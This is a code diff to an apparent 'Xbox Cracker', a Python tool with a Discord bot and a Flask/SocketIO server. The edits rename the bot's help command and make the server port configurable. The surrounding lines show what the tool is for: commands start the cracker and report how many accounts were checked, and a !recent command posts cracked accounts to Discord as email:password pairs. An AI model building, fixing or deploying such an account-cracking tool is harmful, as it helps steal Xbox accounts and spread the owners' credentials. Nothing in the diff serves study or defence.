@@ -111,8 +111,8 @@ if DISCORD_BOT_TOKEN:
             text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
             await ctx.send(f"```{text}```")
 
-    @discord_bot.command(name='help', help='Show all commands')
-    async def help_cmd(ctx):
+    @discord_bot.command(name='bothelp', help='Show all commands')
+    async def bothelp_cmd(ctx):
         embed = discord.Embed(title="🤖 Xbox Cracker Commands", color=0x00ffcc)
         cmds = {
             "!start": "Start the cracker",
@@ -122,7 +122,7 @@ if DISCORD_BOT_TOKEN:
             "!status": "Short status",
             "!total": "Total accounts checked",
             "!recent": "Last 5 valid accounts",
-            "!help": "Show this menu"
+            "!bothelp": "Show this menu"
         }
         for cmd, desc in cmds.items():
             embed.add_field(name=cmd, value=desc, inline=False)
@@ -314,4 +314,5 @@ def webhook_receiver():
 # ---------- MAIN ----------
 if __name__ == '__main__':
     Thread(target=run_discord_bot, daemon=True).start()
-    socketio.run(app, host='0.0.0.0', port=10000, debug=False)
+    port = int(os.environ.get("PORT", 10000))
+    socketio.run(app, host='0.0.0.0', port=port, debug=False)
